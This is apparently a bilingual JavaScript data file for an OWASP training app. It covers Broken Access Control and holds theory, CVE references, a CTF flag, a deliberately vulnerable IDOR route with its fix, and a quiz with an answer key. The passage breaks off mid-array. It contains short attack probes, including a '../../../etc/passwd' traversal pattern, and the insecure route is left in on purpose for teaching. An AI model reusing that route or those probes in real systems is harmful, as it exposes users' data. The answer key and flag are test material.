/* OWASP module metadata and CVE references. */
(() => {
  const M = (ru, en) => ({ ru, en });

const MODS = [
  {
    code: 'A01', name: 'Broken Access Control', nameRu: 'Нарушение контроля доступа',
    risk: 'CRITICAL', owasp2021: 'A01', owasp2025: 'A01',
    cwe: ['CWE-639', 'CWE-284', 'CWE-285', 'CWE-22'],
    flag: 'FLAG{idor_order_admin_is_not_yours}',
    blurb: M(
      'IDOR, повышение привилегий и обход каталогов: права доступа проверяются неправильно.',
      'IDOR, privilege escalation, path traversal — #1 risk worldwide.'
    ),
    theory: M(
`<p><strong>Broken Access Control</strong> — #1 в OWASP Top 10 2021 и 2025. Пользователь получает доступ к ресурсам без проверки прав.</p>
<p>Главный паттерн — <strong>IDOR</strong>: смена числового/UUID идентификатора в URL/теле запроса. <code>GET /api/orders/1</code> → чужой заказ.</p>
<div class="ebox">GET /api/users/2/profile  → 200 + данные alice   ← нарушение
GET /admin/dashboard      → 200 без auth          ← нарушение
POST /api/role {"role":"admin"} → принято         ← vertical privilege escalation</div>
<p><strong>Реальные CVE:</strong> CVE-2021-41773 (Apache path traversal), CVE-2023-23397 (Outlook NTLM leak), CVE-2021-22986 (F5 BIG-IP auth bypass).</p>`,
`<p><strong>Broken Access Control</strong> is #1 in OWASP Top 10 2021 and 2025. Users reach resources without proper authorization checks.</p>
<p>Core pattern — <strong>IDOR</strong>: changing a numeric/UUID identifier in the URL or body. <code>GET /api/orders/1</code> → another user's order.</p>
<div class="ebox">GET /api/users/2/profile  → 200 + alice data   ← violation
GET /admin/dashboard      → 200 without auth   ← violation
POST /api/role {"role":"admin"} → accepted      ← vertical privilege escalation</div>
<p><strong>Real CVEs:</strong> CVE-2021-41773 (Apache path traversal), CVE-2023-23397 (Outlook NTLM leak), CVE-2021-22986 (F5 BIG-IP auth bypass).</p>`
    ),
    vulnCode: `// Vulnerable: no ownership check
app.get('/api/orders/:id', (req, res) => {
  const order = db.orders.find(o => o.id == req.params.id);
  res.json(order); // any user_id
});`,
    fixCode: `// Secure: ownership check
app.get('/api/orders/:id', requireAuth, (req, res) => {
  const order = db.orders.find(o => o.id == req.params.id);
  if (!order || order.userId !== req.user.id)
    return res.status(403).json({error:'Forbidden'});
  res.json(order);
});`,
    quiz: [
      {
        q: M('Что из перечисленного НЕ относится к Broken Access Control в OWASP Top 10:2025?', 'Which of the following does NOT belong to Broken Access Control in OWASP Top 10:2025?'),
        opts: [
          M('SQL Injection', 'SQL Injection'),
          M('CSRF', 'CSRF'),
          M('BFLA', 'BFLA'),
          M('IDOR', 'IDOR'),
        ],
        ans: 0,
        e: M('SQL Injection относится к Injection (A05), а не к Broken Access Control. IDOR, BFLA и CSRF — это сбои контроля доступа, входящие в A01:2025.', 'SQL Injection is an Injection (A05) issue, not Broken Access Control. IDOR, BFLA, and CSRF are all access-control failures listed under A01:2025.'),
      },
      {
        q: M('Какой CWE соответствует Server-Side Request Forgery в редакции 2025 года?', 'Which CWE corresponds to Server-Side Request Forgery in the 2025 edition?'),
        opts: [
          M('CWE-352', 'CWE-352'),
          M('CWE-918', 'CWE-918'),
          M('CWE-601', 'CWE-601'),
          M('CWE-862', 'CWE-862'),
        ],
        ans: 1,
        e: M('CWE-918 — стандартный идентификатор для Server-Side Request Forgery. В OWASP Top 10:2025 SSRF включён в A01 Broken Access Control, а не выделен отдельной категорией.', 'CWE-918 is the standard CWE for Server-Side Request Forgery. In OWASP Top 10:2025, SSRF is folded into A01 Broken Access Control rather than a standalone category.'),
      },
      {
        q: M('IDOR расшифровывается как:', 'IDOR stands for:'),
        opts: [
          M('Internal Denial of Resource', 'Internal Denial of Resource'),
          M('Internal Data Object Retrieval', 'Internal Data Object Retrieval'),
          M('Insecure Direct Object Reference', 'Insecure Direct Object Reference'),
          M('Indirect Direct Object Request', 'Indirect Direct Object Request'),
        ],
        ans: 2,
        e: M('IDOR расшифровывается как Insecure Direct Object Reference: доступ к объекту по id из запроса без проверки, что вызывающий имеет право на этот объект.', 'IDOR stands for Insecure Direct Object Reference: accessing an object by a user-supplied id without verifying the caller is allowed to use that object.'),
      },
      {
        q: M('Принцип «deny by default» означает:', 'The "deny by default" principle means:'),
        opts: [
          M('сервер отклоняет TLS 1.0', 'the server rejects TLS 1.0'),
          M('все запросы логируются', 'all requests are logged'),
          M('все ошибки скрываются от пользователя', 'all errors are hidden from the user'),
          M('доступ разрешён только явно указанным ролям, всё остальное запрещено', 'access is granted only to explicitly authorized roles; everything else is denied'),
        ],
        ans: 3,
        e: M('Принцип «deny by default» означает: доступ только явно разрешённым ролям или правам, всё остальное запрещено. Логирование или сокрытие ошибок этот принцип не реализуют.', 'Deny by default means only explicitly authorized roles or permissions get access; anything not listed is refused. Logging or hiding errors does not implement this principle.'),
      },
      {
        q: M('BFLA — это:', 'BFLA stands for:'),
        opts: [
          M('Broken Function Level Authorization', 'Broken Function Level Authorization'),
          M('Backend Function Logic Attack', 'Backend Function Logic Attack'),
          M('Basic File Level Access', 'Basic File Level Access'),
          M('Broken Field Level Auth', 'Broken Field Level Auth'),
        ],
        ans: 0,
        e: M('BFLA — Broken Function Level Authorization: отсутствует или неверна проверка, что вызывающий может выполнять привилегированную функцию (например admin API).', 'BFLA means Broken Function Level Authorization — missing or weak checks that a caller may invoke a privileged function (for example an admin API).'),
      },
      {
        q: M('Почему проверка прав доступа только на фронтенде (скрытие кнопки в UI) не считается контролем доступа?', 'Why doesn\'t checking access rights only on the frontend (hiding a button in the UI) count as access control?'),
        opts: [
          M('Браузеры блокируют такие проверки', 'Browsers block such checks'),
          M('Атакующий может напрямую обратиться к API/эндпоинту в обход UI', 'An attacker can call the API/endpoint directly, bypassing the UI'),
          M('JS нельзя тестировать', 'JS cannot be tested'),
          M('Это слишком медленно', 'It\'s too slow'),
        ],
        ans: 1,
        e: M('Проверки только в UI — не enforcement: атакующий вызывает тот же API через curl или прокси, обходя скрытую кнопку. Контроль доступа должен выполняться на доверенном сервере.', 'UI-only checks are not enforcement: an attacker can call the same API with curl or a proxy and skip the hidden button entirely. Access control must run on the trusted server.'),
      },
      {
        q: M('Какой HTTP-статус-код различие (403 vs 404) может помочь атакующему в энумерации ресурсов?', 'Which HTTP status code distinction (403 vs 404) can help an attacker enumerate resources?'),
        opts: [
          M('Не имеет значения для access control', 'Doesn\'t matter for access control'),
          M('Указывает на использование WAF', 'Indicates WAF usage'),
          M('Позволяет отличить «ресурс существует, но нет доступа» от «ресурса нет»', 'Lets an attacker distinguish "resource exists but no access" from "resource doesn\'t exist"'),
          M('Позволяет узнать версию сервера', 'Reveals the server version'),
        ],
        ans: 2,
        e: M('Ответ 403 для существующих запрещённых ресурсов и 404 только для отсутствующих позволяет перечислять, что есть. Единообразные ответы снижают перечисление (утечки в духе CWE-200).', 'Returning 403 for existing forbidden resources and 404 only when missing lets attackers map what exists. Consistent responses reduce sensitive-info enumeration (CWE-200 style leaks).'),
      },
      {
        q: M('Что такое force browsing (CWE-425)?', 'What is force browsing (CWE-425)?'),
        opts: [
          M('Автоматическое обновление браузера', 'Automatic browser update'),
          M('Принудительный редирект', 'Forced redirect'),
          M('DDoS через браузер', 'DDoS via browser'),
          M('Угадывание/перебор URL страниц без ссылок в UI', 'Guessing/enumerating URLs not linked in the UI'),
        ],
        ans: 3,
        e: M('Force browsing (CWE-425) — угадывание или запрос URL без ссылок в UI, чтобы добраться до скрытых admin-страниц или файлов без серверной авторизации.', 'Force browsing (CWE-425) is guessing or requesting URLs not linked in the UI to reach hidden admin pages or files that lack server-side authorization.'),
      },
      {
        q: M('Уязвимость CORS-мисконфигурации возникает, когда:', 'A CORS misconfiguration vulnerability occurs when:'),
        opts: [
          M('Access-Control-Allow-Origin отражает любой Origin вместе с Allow-Credentials: true', 'Access-Control-Allow-Origin reflects any Origin together with Allow-Credentials: true'),
          M('используется HTTPS', 'HTTPS is used'),
          M('отсутствует Content-Type заголовок', 'the Content-Type header is missing'),
          M('сервер вообще не поддерживает CORS', 'the server doesn\'t support CORS at all'),
        ],
        ans: 0,
        e: M('Отражение любого Origin вместе с Access-Control-Allow-Credentials: true позволяет вредоносному сайту читать аутентифицированные cross-origin ответы — классический сбой CORS.', 'Reflecting any Origin with Access-Control-Allow-Credentials: true lets a malicious site read authenticated cross-origin responses. That is a classic CORS access-control failure.'),
      },
      {
        q: M('Атрибут cookie, отсутствие которого попало в список CWE категории A01:2025 (CWE-1275):', 'The cookie attribute whose absence is listed under A01:2025 (CWE-1275) is:'),
        opts: [
          M('Secure', 'Secure'),
          M('SameSite', 'SameSite'),
          M('Max-Age', 'Max-Age'),
          M('HttpOnly', 'HttpOnly'),
        ],
        ans: 1,
        e: M('CWE-1275 относится к отсутствию атрибута SameSite у cookie. Без SameSite (и смежных защит от CSRF) браузер может слать session cookie в cross-site запросах, что ведёт к CSRF в A01.', 'CWE-1275 covers missing SameSite on cookies. Without SameSite (and related CSRF defenses), browsers may send session cookies on cross-site requests, enabling CSRF under A01.'),
      },
      {
        q: M('Атакующий модифицирует JWT, меняя alg на "none". Какой класс уязвимости это эксплуатирует?', 'An attacker modifies a JWT, setting alg to "none". Which class of vulnerability does this exploit?'),
        opts: [
          M('Cryptographic Failure', 'Cryptographic Failure'),
          M('Insecure Design', 'Insecure Design'),
          M('Отсутствие проверки подписи токена на сервере (Broken Access Control)', 'Missing server-side signature verification (Broken Access Control)'),
          M('Injection', 'Injection'),
        ],
        ans: 2,
        e: M('Принятие JWT с alg=none (или пропуск проверки подписи) — отсутствие серверной проверки целостности токена: подмена метаданных в Broken Access Control, а не «чистый» крипто-провал.', 'Accepting JWT alg=none (or skipping signature verification) is missing server-side authz/integrity of the token — metadata tampering under Broken Access Control, not a pure crypto design choice.'),
      },
      {
        q: M('CSRF-атака требует от атакующего:', 'A CSRF attack requires the attacker to:'),
        opts: [
          M('знания пароля жертвы', 'know the victim\'s password'),
          M('MITM-позиции в сети', 'be in a MITM position on the network'),
          M('физического доступа к устройству жертвы', 'have physical access to the victim\'s device'),
          M('чтобы жертва была аутентифицирована и выполнила действие через подготовленный запрос без ведома', 'have the victim authenticated and trick them into performing an action via a crafted request without their knowledge'),
        ],
        ans: 3,
        e: M('CSRF использует автоматическую отправку браузером сессии жертвы на сайт, где она уже вошла; пароль не нужен, если session cookie уходит с подготовленным запросом.', 'CSRF abuses the browser’s automatic sending of the victim’s session to a site where the victim is already logged in; the attacker does not need the password if the session cookie is attached.'),
      },
      {
        q: M('Какой заголовок/механизм — основная защита от CSRF наряду с anti-CSRF токеном?', 'Which header/mechanism is the primary defense against CSRF alongside an anti-CSRF token?'),
        opts: [
          M('SameSite cookie атрибут', 'SameSite cookie attribute'),
          M('Content-Security-Policy', 'Content-Security-Policy'),
          M('X-Content-Type-Options', 'X-Content-Type-Options'),
          M('X-Frame-Options', 'X-Frame-Options'),
        ],
        ans: 0,
        e: M('Помимо anti-CSRF токенов, атрибут SameSite у cookie ограничивает отправку cookie в cross-site запросах и является основной browser-side защитой от CSRF в контексте A01.', 'Besides anti-CSRF tokens, the SameSite cookie attribute limits when cookies are sent on cross-site requests and is a primary browser-side CSRF defense listed with A01 controls.'),
      },
      {
        q: M('Path Traversal (CWE-22) чаще всего эксплуатируется через:', 'Path Traversal (CWE-22) is most often exploited through:'),
        opts: [
          M('HTTP-заголовок Referer', 'the Referer HTTP header'),
          M('последовательности вида ../../../etc/passwd в параметрах, обрабатывающих пути к файлам', 'sequences like ../../../etc/passwd in parameters that handle file paths'),
          M('SQL-запрос', 'an SQL query'),
          M('XML-парсер', 'an XML parser'),
        ],
        ans: 1,
        e: M('Path Traversal (CWE-22) внедряет сегменты вида ../ в параметры пути, чтобы сервер читал файлы вне допустимого каталога (например /etc/passwd).', 'Path Traversal (CWE-22) injects ../-style segments into path parameters so the server reads files outside the intended directory (for example /etc/passwd).'),
      },
      {
        q: M('Confused Deputy (CWE-441) в контексте Broken Access Control описывает ситуацию, когда:', 'Confused Deputy (CWE-441) in the context of Broken Access Control describes a situation where:'),
        opts: [
          M('два администратора конфликтуют в правах', 'two admins have conflicting rights'),
          M('сертификат истёк', 'a certificate has expired'),
          M('привилегированный компонент обманом заставляют выполнить действие от имени менее привилегированного атакующего', 'a privileged component is tricked into acting on behalf of a less-privileged attacker'),
          M('пользователь путает логин и пароль', 'a user confuses their login and password'),
        ],
        ans: 2,
        e: M('Confused Deputy (CWE-441) — привилегированный компонент действует по входным данным атакующего и выполняет действия, которые атакующий сам сделать не мог.', 'Confused Deputy (CWE-441) is when a privileged component acts on attacker-controlled input and thus performs privileged actions the attacker could not do directly.'),
      },
      {
        q: M('Почему SSRF в 2025 включили в категорию Broken Access Control, а не оставили отдельной категорией?', 'Why was SSRF folded into Broken Access Control in 2025 instead of remaining a separate category?'),
        opts: [
          M('SSRF больше не встречается', 'SSRF no longer occurs'),
          M('SSRF устарела как класс', 'SSRF is obsolete as a class'),
          M('Так решило голосование сообщества без обоснования', 'It was a community vote with no underlying rationale'),
          M('По сути SSRF — нарушение контроля доступа сервера к внутренним ресурсам', 'At its core, SSRF is a violation of the server\'s access control over internal resources'),
        ],
        ans: 3,
        e: M('В 2025 OWASP рассматривает SSRF как обман сервера: он обращается к внутренним ресурсам, недоступным атакующему — сбой контроля доступа к server-side reachability, а не отдельный ранг Top 10.', 'OWASP 2025 treats SSRF as the server being tricked into reaching internal resources the attacker should not access — an access-control failure over server-side reachability, not a separate Top 10 rank.'),
      },
      {
        q: M('Типичная цель SSRF-атаки в облачной инфраструктуре:', 'A typical target of an SSRF attack in cloud infrastructure is:'),
        opts: [
          M('cloud metadata endpoint (например, 169.254.169.254)', 'the cloud metadata endpoint (e.g., 169.254.169.254)'),
          M('DNS-сервер провайдера', 'the provider\'s DNS server'),
          M('NTP-сервер', 'an NTP server'),
          M('обход CAPTCHA', 'bypassing a CAPTCHA'),
        ],
        ans: 0,
        e: M('Cloud metadata (часто 169.254.169.254) хранит credentials и конфигурацию; SSRF до этого endpoint — критичный обход контроля доступа к внутренним ресурсам.', 'Cloud instance metadata (often 169.254.169.254) holds credentials and config; SSRF that can hit it is a high-impact internal access-control bypass.'),
      },
      {
        q: M('Какая техника позволяет обойти SSRF allow-list, основанный на проверке домена, а не итогового IP?', 'Which technique can bypass an SSRF allow-list that checks the domain rather than the resolved IP?'),
        opts: [
          M('XML entity expansion', 'XML entity expansion'),
          M('DNS rebinding', 'DNS rebinding'),
          M('Base64-кодирование', 'Base64 encoding'),
          M('Increment ID', 'Increment ID'),
        ],
        ans: 1,
        e: M('DNS rebinding сначала резолвит имя в разрешённый IP, затем — во внутренний, обходя SSRF allow-list, который проверяет только домен, а не итоговый IP.', 'DNS rebinding makes a hostname resolve first to an allow-listed IP, then later to an internal IP, defeating domain-only SSRF allow-lists that never recheck the resolved address.'),
      },
      {
        q: M('Пентестер тестирует IDOR. Какая методика наиболее эффективна?', 'A pentester is testing for IDOR. Which methodology is most effective?'),
        opts: [
          M('Проверка версии TLS', 'Checking the TLS version'),
          M('Только сканирование портов', 'Port scanning only'),
          M('Замена ID/UUID в запросе на значение, полученное в другой (чужой) сессии', 'Replacing the ID/UUID in a request with a value obtained from a different (someone else\'s) session'),
          M('Brute-force пароля', 'Brute-forcing the password'),
        ],
        ans: 2,
        e: M('Эффективный тест IDOR — подмена идентификаторов объектов между сессиями (или tenant) при той же аутентификации, доказывая отсутствие проверки владения.', 'Effective IDOR testing swaps object identifiers between sessions (or tenants) while keeping the same auth context, proving the server does not enforce ownership.'),
      },
      {
        q: M('Вертикальная эскалация привилегий отличается от горизонтальной тем, что:', 'Vertical privilege escalation differs from horizontal privilege escalation in that:'),
        opts: [
          M('горизонтальная невозможна без MFA', 'horizontal is impossible without MFA'),
          M('вертикальная работает только в мобильных приложениях', 'vertical only occurs in mobile apps'),
          M('разницы нет', 'there is no difference'),
          M('вертикальная — доступ user → admin, горизонтальная — доступ к данным другого пользователя того же уровня', 'vertical is user → admin access, horizontal is access to another user\'s data at the same level'),
        ],
        ans: 3,
        e: M('Вертикальная эскалация повышает уровень прав (user → admin); горизонтальная остаётся на той же роли, но даёт доступ к ресурсам другого пользователя.', 'Vertical escalation raises privilege level (user to admin); horizontal stays at the same role but accesses another principal’s resources.'),
      },
      {
        q: M('Согласно данным OWASP 2025, какой процент протестированных приложений содержал хотя бы один CWE из категории Broken Access Control?', 'According to OWASP 2025 data, what percentage of tested applications contained at least one CWE from the Broken Access Control category?'),
        opts: [
          M('100%', '100%'),
          M('50%', '50%'),
          M('73%', '73%'),
          M('25%', '25%'),
        ],
        ans: 0,
        e: M('По данным OWASP Top 10:2025, 100% протестированных приложений имели хотя бы один CWE из Broken Access Control — наиболее распространённая категория.', 'OWASP Top 10:2025 reports that 100% of tested applications had at least one CWE from Broken Access Control — the most common category by occurrence.'),
      },
      {
        q: M('Что из перечисленного — правильная практика реализации access control согласно OWASP?', 'Which of the following is a correct practice for implementing access control per OWASP?'),
        opts: [
          M('Хранить права доступа в cookie без подписи', 'Store access rights in an unsigned cookie'),
          M('Реализовать единожды и переиспользовать во всём приложении', 'Implement it once and reuse it throughout the application'),
          M('Полагаться на скрытие эндпоинтов (security through obscurity)', 'Rely on hiding endpoints (security through obscurity)'),
          M('Реализовывать проверку прав в каждом контроллере заново', 'Re-implement the check in every controller from scratch'),
        ],
        ans: 1,
        e: M('OWASP рекомендует единую переиспользуемую точку авторизации вместо копипасты, security through obscurity или хранения прав в клиентских/неподписанных данных.', 'OWASP recommends a single reusable authorization mechanism instead of copy-pasted checks, obscurity, or client-controlled rights stores that are easy to miss or forge.'),
      },
      {
        q: M('CWE-566 из списка A01:2025 описывает:', 'CWE-566 from the A01:2025 list describes:'),
        opts: [
          M('XSS через SQL', 'XSS via SQL'),
          M('Слабый TLS шифр', 'Weak TLS cipher'),
          M('Authorization Bypass Through User-Controlled SQL Primary Key', 'Authorization Bypass Through User-Controlled SQL Primary Key'),
          M('Утечку памяти', 'Memory leak'),
        ],
        ans: 2,
        e: M('CWE-566 — Authorization Bypass Through User-Controlled SQL Primary Key: клиентский primary key попадает в SQL без проверки владения/авторизации.', 'CWE-566 is Authorization Bypass Through User-Controlled SQL Primary Key: a client-chosen primary key is used in a query without an ownership/authorization check.'),
      },
      {
        q: M('Инструмент Burp Suite при тестировании access control чаще всего используется для:', 'Burp Suite is most often used when testing access control to:'),
        opts: [
          M('сканирования Wi-Fi', 'scan Wi-Fi'),
          M('статического анализа кода', 'statically analyze source code'),
          M('фаззинга памяти', 'fuzz memory'),
          M('перехвата и модификации запросов (замена параметров, ролей, токенов) вручную/через Intruder', 'intercept and manually/automatically (Intruder) modify requests — swapping parameters, roles, tokens'),
        ],
        ans: 3,
        e: M('Proxy и Intruder в Burp Suite позволяют менять id, роли, методы и токены и доказывать отсутствие серверной авторизации — основа тестирования access control.', 'Burp Suite’s proxy and Intruder let testers rewrite ids, roles, methods, and tokens to prove missing server-side authorization — the core of access-control testing.'),
      },
      {
        q: M('Почему стейтфул session ID нужно инвалидировать на сервере при логауте?', 'Why should a stateful session ID be invalidated server-side on logout?'),
        opts: [
          M('Чтобы украденный/оставшийся в браузере токен нельзя было переиспользовать после выхода', 'So a token left in the browser (or stolen) cannot be reused after logout'),
          M('Чтобы уменьшить объём БД', 'To reduce database size'),
          M('Это требование GDPR напрямую', 'It\'s a direct GDPR requirement'),
          M('Не требуется, если используется HTTPS', 'Not required if HTTPS is used'),
        ],
        ans: 0,
        e: M('Если сервер принимает сессию после logout, оставшийся или украденный session id остаётся рабочим. Инвалидация на сервере завершает сессию на доверенной стороне.', 'If the server still accepts a session after logout, a leftover or stolen session id remains valid. Server-side invalidation ends the session on the trusted side.'),
      },
      {
        q: M('Какая из мер — НЕ относится к предотвращению Broken Access Control?', 'Which of the following is NOT a Broken Access Control mitigation?'),
        opts: [
          M('Модель прав на основе владения записью (record ownership)', 'Record-ownership–based permission model'),
          M('Хранение паролей через bcrypt', 'Storing passwords with bcrypt'),
          M('Логирование отказов авторизации', 'Logging access-control failures'),
          M('Rate limiting на чувствительные эндпоинты', 'Rate limiting on sensitive endpoints'),
        ],
        ans: 1,
        e: M('Хранение паролей с bcrypt — криптографическая мера (A04 Cryptographic Failures), а не mitigation для Broken Access Control. Rate limiting, логирование отказов и ownership — защиты A01.', 'Storing passwords with bcrypt is a cryptographic control (A04 Cryptographic Failures), not an access-control mitigation. Rate limits, authz logging, and ownership models are A01 defenses.'),
      },
      {
        q: M('Directory listing (CWE-548), включённый на веб-сервере, может привести к:', 'Directory listing (CWE-548) left enabled on a web server can lead to:'),
        opts: [
          M('улучшению SEO', 'improved SEO'),
          M('автоматическому шифрованию трафика', 'automatic traffic encryption'),
          M('раскрытию структуры файлов и потенциально чувствительных файлов посторонним', 'disclosure of the file structure, potentially exposing sensitive files'),
          M('увеличению производительности', 'improved performance'),
        ],
        ans: 2,
        e: M('Включённый directory listing (CWE-548) раскрывает структуру файлов и путей и может обнажить бэкапы, конфиги и другие чувствительные данные.', 'Enabled directory listing (CWE-548) reveals file and path structure and can expose backups, configs, or other sensitive content that should not be browsable.'),
      },
      {
        q: M('Open Redirect (CWE-601) обычно используется атакующим для:', 'Open Redirect (CWE-601) is usually used by an attacker to:'),
        opts: [
          M('DoS-атаки', 'mount a DoS attack'),
          M('SQL-инъекции', 'perform SQL injection'),
          M('обхода WAF по IP', 'bypass an IP-based WAF'),
          M('фишинга — переход по легитимной ссылке домена жертвы с редиректом на вредоносный сайт', 'phish victims — a legitimate-looking link on the target\'s domain redirects to a malicious site'),
        ],
        ans: 3,
        e: M('Open Redirect (CWE-601) чаще всего для фишинга: URL на доверенном домене перенаправляет на вредоносный сайт, повышая доверие к приманке.', 'Open Redirect (CWE-601) is mainly abused for phishing: a trusted domain URL redirects users to a malicious site, increasing credibility of the lure.'),
      },
      {
        q: M('Что означает «Authorization Bypass Through User-Controlled Key» (CWE-639)?', 'What does "Authorization Bypass Through User-Controlled Key" (CWE-639) mean?'),
        opts: [
          M('Приложение использует значение, присланное клиентом, как ключ доступа к записи без проверки принадлежности', 'The app uses a client-supplied value as the key to access a record without verifying ownership'),
          M('Использование дефолтного пароля', 'Use of a default password'),
          M('Утечка API-ключа в git', 'An API key leaked in git'),
          M('Слабый криптографический ключ', 'A weak cryptographic key'),
        ],
        ans: 0,
        e: M('CWE-639: приложение берёт ключ из запроса (id, путь и т.п.) для доступа к записи и не проверяет владение/права аутентифицированного пользователя — классический IDOR/BOLA.', 'CWE-639 means the app takes a user-controlled key (id, path, etc.) to fetch a record and skips verifying that the authenticated user owns or may access it — classic IDOR/BOLA.'),
      },
      {
        q: M('Zero Trust архитектура относится к Broken Access Control тем, что:', 'Zero Trust architecture relates to Broken Access Control in that it:'),
        opts: [
          M('заменяет TLS', 'replaces TLS'),
          M('предполагает проверку прав на каждом запросе, не доверяя факту нахождения «внутри периметра»', 'assumes every request is verified for authorization, rather than trusting the fact of being "inside the perimeter"'),
          M('не связана с access control', 'is unrelated to access control'),
          M('отменяет необходимость аутентификации', 'removes the need for authentication'),
        ],
        ans: 1,
        e: M('Zero Trust не доверяет «нахождению внутри периметра»: каждый запрос проверяется на аутентификацию и авторизацию — напрямую против паттернов Broken Access Control.', 'Zero Trust assumes no implicit trust from network location: every request must be authenticated and authorized, which directly addresses Broken Access Control patterns.'),
      },
      {
        q: M('Симптом «An accessible API with missing access controls for POST, PUT и DELETE» означает:', 'The symptom "an accessible API with missing access controls for POST, PUT and DELETE" means:'),
        opts: [
          M('отсутствие HTTPS', 'HTTPS is absent'),
          M('отсутствие документации Swagger', 'Swagger docs are missing'),
          M('GET-запросы защищены проверкой прав, а модифицирующие методы — нет', 'GET requests are protected by an authorization check, but the modifying methods are not'),
          M('API вообще не работает', 'the API doesn\'t work at all'),
        ],
        ans: 2,
        e: M('Защита только GET при открытых POST/PUT/DELETE — неполная method-level авторизация: чтение ограничено, а изменяющие операции — нет.', 'Protecting only GET while leaving POST/PUT/DELETE open is incomplete method-level authorization: read may be gated, but state-changing operations are not.'),
      },
      {
        q: M('Классический пример из OWASP-документации: атакующий меняет параметр acct в URL запроса к своему счёту на чужой. Это пример:', 'A classic OWASP example: an attacker changes the acct parameter in a URL for their own account to someone else\'s. This is an example of:'),
        opts: [
          M('XSS', 'XSS'),
          M('SSRF', 'SSRF'),
          M('CSRF', 'CSRF'),
          M('IDOR', 'IDOR'),
        ],
        ans: 3,
        e: M('Подмена параметра acct (или аналогичного id) на чужое значение без проверки владения — классический пример IDOR / Insecure Direct Object Reference.', 'Changing acct (or similar id) to another user’s value without ownership checks is the textbook IDOR / Insecure Direct Object Reference scenario.'),
      },
      {
        q: M('Какая проверка НЕ является достаточной защитой от access control атак:', 'Which check is NOT sufficient defense against access-control attacks?'),
        opts: [
          M('скрытие ссылки в интерфейсе (UI-only)', 'hiding a link in the UI only'),
          M('серверная проверка роли на каждый запрос', 'server-side role check on every request'),
          M('rate limiting + логирование отказов', 'rate limiting + logging denials'),
          M('проверка владения записью в domain-модели', 'checking record ownership in the domain model'),
        ],
        ans: 0,
        e: M('Скрытие ссылки меняет только UX; endpoint может остаться доступным прямым запросом. Реальная защита — серверная авторизация, ownership и мониторинг отказов.', 'Hiding a link only changes UX; the endpoint may still work for a direct request. Real defense is server-side authorization, ownership checks, and monitoring.'),
      },
      {
        q: M('Метаданные .git, оставленные в веб-корне (CWE-538), опасны, потому что:', 'Leftover .git metadata in the web root (CWE-538) is dangerous because it:'),
        opts: [
          M('блокируют индексацию поисковиками', 'blocks search-engine indexing'),
          M('могут раскрыть историю коммитов, включая случайно закоммиченные секреты', 'can expose commit history, including accidentally committed secrets'),
          M('вызывают XSS', 'causes XSS'),
          M('увеличивают время загрузки страницы', 'increases page load time'),
        ],
        ans: 1,
        e: M('Доступные .git-метаданные (CWE-538) могут отдать историю коммитов и содержимое, включая секреты, которые когда-то попали в репозиторий.', 'Public .git metadata (CWE-538) can expose full commit history and blobs, including secrets that were committed and later «removed» from the working tree.'),
      },
      {
        q: M('Что из перечисленного — пример горизонтальной privilege escalation?', 'Which of the following is an example of horizontal privilege escalation?'),
        opts: [
          M('Обычный пользователь получает права администратора', 'A regular user gains admin rights'),
          M('Гостевой доступ отключается', 'Guest access is disabled'),
          M('Пользователь A читает личные сообщения пользователя B, имея тот же уровень доступа', 'User A reads user B\'s private messages while having the same privilege level'),
          M('Смена пароля администратора', 'The admin password is changed'),
        ],
        ans: 2,
        e: M('Горизонтальная эскалация — злоупотребление на том же уровне прав: доступ к данным другого пользователя (например чужие сообщения). Получение admin — вертикальная.', 'Horizontal escalation is peer-level abuse: same role, another user’s data (for example reading someone else’s messages). Gaining admin is vertical escalation.'),
      },
      {
        q: M('Почему короткоживущие JWT в паре с refresh-токеном предпочтительнее долгоживущих JWT?', 'Why are short-lived JWTs paired with a refresh token preferable to long-lived JWTs?'),
        opts: [
          M('JWT иначе не поддерживает подпись', 'JWT otherwise doesn\'t support signatures'),
          M('Уменьшают вычислительную нагрузку сервера', 'They reduce server compute load'),
          M('Требование стандарта HTML5', 'An HTML5 requirement'),
          M('Сокращают окно, в течение которого украденный access-токен остаётся валидным', 'They shrink the window during which a stolen access token remains valid'),
        ],
        ans: 3,
        e: M('Короткоживущие access JWT быстро истекают при краже; refresh-токены можно ротировать и отзывать, сокращая окно действия скомпрометированного access token.', 'Short-lived access JWTs expire quickly if stolen; refresh tokens can be rotated and revoked, shrinking the useful lifetime of a compromised access token.'),
      },
      {
        q: M('Разница между Missing Authorization (CWE-862) и Incorrect Authorization (CWE-863):', 'The difference between Missing Authorization (CWE-862) and Incorrect Authorization (CWE-863):'),
        opts: [
          M('первое — проверка вообще отсутствует, второе — проверка есть, но реализована неверно', 'the former means the check is absent entirely, the latter means a check exists but is implemented incorrectly'),
          M('это синонимы', 'they\'re synonyms'),
          M('второе относится только к базам данных', 'the latter applies only to databases'),
          M('первое относится только к API', 'the former applies only to APIs'),
        ],
        ans: 0,
        e: M('CWE-862 Missing Authorization — проверки нет вообще; CWE-863 Incorrect Authorization — проверка есть, но логика или политика неверны.', 'CWE-862 Missing Authorization means no check at all; CWE-863 Incorrect Authorization means a check runs but the logic or policy is wrong.'),
      },
      {
        q: M('При аудите CORS-политики нужно проверить в первую очередь:', 'When auditing a CORS policy, the first thing to check is:'),
        opts: [
          M('наличие robots.txt', 'presence of robots.txt'),
          M('отражается ли произвольный Origin в Access-Control-Allow-Origin вместе с Allow-Credentials: true', 'whether an arbitrary Origin is reflected in Access-Control-Allow-Origin together with Allow-Credentials: true'),
          M('версию Node.js', 'the Node.js version'),
          M('размер cookie', 'cookie size'),
        ],
        ans: 1,
        e: M('Ключевая проверка CORS: отражается ли произвольный Origin вместе с Allow-Credentials: true, что даёт credentialed cross-origin кражу данных.', 'The critical CORS audit is whether untrusted Origins are reflected with Allow-Credentials: true, enabling credentialed cross-origin data theft.'),
      },
      {
        q: M('UNIX Symlink Following (CWE-61) — это уязвимость, при которой:', 'UNIX Symlink Following (CWE-61) is a vulnerability where:'),
        opts: [
          M('браузер не поддерживает JS', 'the browser doesn\'t support JS'),
          M('сервер зависает при большом трафике', 'the server hangs under high traffic'),
          M('приложение неправильно обрабатывает символические ссылки, что позволяет получить доступ к файлам вне ожидаемой директории', 'the application mishandles symbolic links, allowing access to files outside the intended directory'),
          M('TLS-сертификат просрочен', 'the TLS certificate has expired'),
        ],
        ans: 2,
        e: M('UNIX Symlink Following (CWE-61) — небезопасная обработка символических ссылок, из-за которой приложение читает или пишет файлы вне допустимого каталога.', 'UNIX Symlink Following (CWE-61) occurs when the app follows symlinks unsafely and reads or writes files outside the intended directory tree.'),
      },
      {
